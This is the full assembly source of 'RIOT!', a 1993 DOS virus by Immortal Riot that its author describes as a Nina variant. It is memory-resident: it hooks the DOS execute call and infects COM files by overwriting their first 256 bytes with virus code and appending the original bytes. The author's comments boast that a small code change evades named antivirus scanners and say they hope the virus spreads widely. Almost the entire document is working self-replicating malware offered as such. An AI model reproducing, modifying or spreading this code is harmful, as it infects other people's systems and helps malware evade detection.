; VirusName : RIOT! - Revolution In Our Time
; Country   : Sweden
; Author    : The Unforiven / Immortal Riot
; Date	    : 15/09/1993
;
;
; This is a mutation of the NINA virus, and well,
; havn't really changed much in this code, just
; fooled Mcafee's Scan and Dr Alan Toolkit.
;
; Okey, this might not be the very best mutation born,
; but think in this way, if this mutation is so	bad
; then aren't the anti-virus products even worse ?
;
; The original virus was pretty "OK", it is a RES virus,
; non-overwriting com infector. It will infect the program
; after you have started it. It will not infect renamed
; exe files. (..It looks at the victim's fileheader..)
;
; This was originally found in Bulgaria (...where else...)
; but this one will probably be found in Sweden..<grin!>..
;
; Really hope this file will annoy some folks around,
; cuz it certainly annoyed me!..<no more comments>...
;
; This virus don't got a "trash" routine, cuz I figure
; it to very funny anyway, and when it's a resident
; virus, we can hope it'll travel around a while,
; instead of just trash the sorry swapper who gets it.
;
; Scan v108 don't find this, neither does S&S Toolkit 6.54,
; havn't tried with TBScan/F-Prot, but they will probably
; identify it as the "Nina" virus.
;
; Remember..Peace In Our Time.. ...NOT!

.model tiny
.code
org 100h
start:
;		push	ax			; Original push "ax",
                PUSH    DX			; But push dx instead,
						; and S&S FindViru can't
						; find it as NINA-256 :)

                mov     ax,9753h                ; installation check
                int     21h
                mov     ax,ds
                dec     ax
                mov     ds,ax                   ; ds->program MCB
                mov     ax,ds:[3]               ; get size word
                push    bx
                push    es
                sub     ax,40h                  ; reserve 40h paragraphs
                mov     bx,ax
                mov     ah,4Ah                  ; Shrink memory allocation
                int     21h

                mov     ah,48h                  ; Allocate 3Fh paragraphs
                mov     bx,3Fh                  ; for the virus
                int     21h

                mov     es,ax                   ; copy virus to high
                xor     di,di                   ; memory
                mov     si,offset start + 10h   ; start at MCB:110h
                mov     cx,100h                 ; (same as PSP:100h)
                rep     movsb
                sub     ax,10h                  ; adjust offset as if it
                push    ax                      ; originated at 100h
                mov     ax,offset highentry
                push    ax
                retf

highentry:
                mov     byte ptr cs:[0F2h],0AAh ; change MCB's owner so the
                                                ; memory isn't freed when 
                                                ; the program terminates
                mov     ax,3521h                ; get int 21h vector
                int     21h

                mov     word ptr cs:oldint21,bx ; save it
                mov     word ptr cs:oldint21+2,es
                push    es
                pop     ds
                mov     dx,bx
                mov     ax,2591h                ; Int 91h to int 21h
                int     21h

                push    cs
                pop     ds
                mov     dx,offset int21
                mov     al,21h              ; set int 21h to virus vector
                int     21h

                pop     ds                      ; ds->original program PSP
                pop     bx
                push    ds
                pop     es

ENDFILE         dw      100h			; Size of infected COM file

return_COM:
                mov     di,100h                 ; restore original
                mov     si,endfile              ; file
                add     si,di                   ; adjust for COM starting
                mov     cx,100h                 ; offset
                rep     movsb
                pop     ax
                push    ds                      ; jmp back to original
                mov     bp,100h                 ; file (PSP:100)
                push    bp
                retf
exit_install:
                pop     ax                      ; pop CS:IP and flags in
                pop     ax                      ; order to balance the
                pop     ax                      ; stack and then exit the
                jmp     short return_COM        ; infected COM file
int21:
                cmp     ax,9753h                ; installation check?
                je      exit_install
                cmp     ax,4B00h                ; execute?
                jne     exitint21               ; nope, quit
                push    ax                      ; save registers
                push    bx
                push    cx
                push    dx
                push    ds
                call    infect
                pop     ds                      ; restore registers
                pop     dx
                pop     cx
                pop     bx
                pop     ax
exitint21:
                db      0eah ; jmp far ptr
oldint21        dd      ?

infect:
                mov     ax,3D02h                ; open file read/write
                int     91h
                jc      exit_infect
                mov     bx,ax
                mov     cx,100h
                push    cs
                pop     ds
                mov     ah,3Fh                  ; Read first 100h bytes
                mov     dx,offset endvirus
                int     91h
                mov     ax,word ptr endvirus
                cmp     ax,'MZ'                 ; exit if EXE
                je      close_exit_infect
                cmp     ax,'ZM'                 ; exit if EXE
                je      close_exit_infect
                cmp     word ptr endvirus+2,9753h ; exit if already
                je      close_exit_infect       ; infected
                mov     al,2                    ; go to end of file
                call    move_file_pointer
                cmp     ax,0FEB0h               ; exit if too large
                ja      close_exit_infect
                cmp     ax,1F4h                 ; or too small for
                jb      close_exit_infect       ; infection
                mov     endfile,ax              ; save file size
                call    write
                mov     al,0                    ; go to start of file
                call    move_file_pointer
                mov     dx,100h                 ; write virus
                call    write
close_exit_infect:
                mov     ah,3Eh                  ; Close file
                int     91h
exit_infect:
                retn

move_file_pointer:
                push    dx
                xor     cx,cx
                xor     dx,dx
                mov     ah,42h
                int     91h
                pop     dx
                retn

write:
                mov     ah,40h	 ; 40HEX..writing to file
                mov     cx,100h
                int     91h
                retn

                db	' RIOT!' ; Revolution In Our Time!
endvirus:			                                       
                int     20h      ; original COM file
		end     start

; Greeting goes out to : Raver, Metal Militia, Scavenger, 
; and all other revolutionary coders in our time...